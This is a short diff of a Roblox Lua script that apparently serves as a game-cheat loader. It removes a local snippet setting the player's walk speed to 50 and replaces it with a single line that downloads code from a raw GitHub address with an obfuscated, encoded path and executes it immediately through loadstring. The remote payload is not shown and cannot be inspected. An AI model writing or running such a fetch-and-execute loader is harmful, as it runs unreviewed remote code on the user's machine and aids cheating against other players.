@@ -1,6 +1,1 @@
-print("Welcome to the Unordinariness Loader!")
-local player = game.Players.LocalPlayer
-if player then
-  player.Character.Humanoid.WalkSpeed = 50
-  print("Your character's speed has been increased!")
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OGSunny/-/refs/heads/main/%F0%9D%91%BC%F0%9D%91%B5%F0%9D%92%89%F0%9D%92%96%F0%9D%92%83"))()
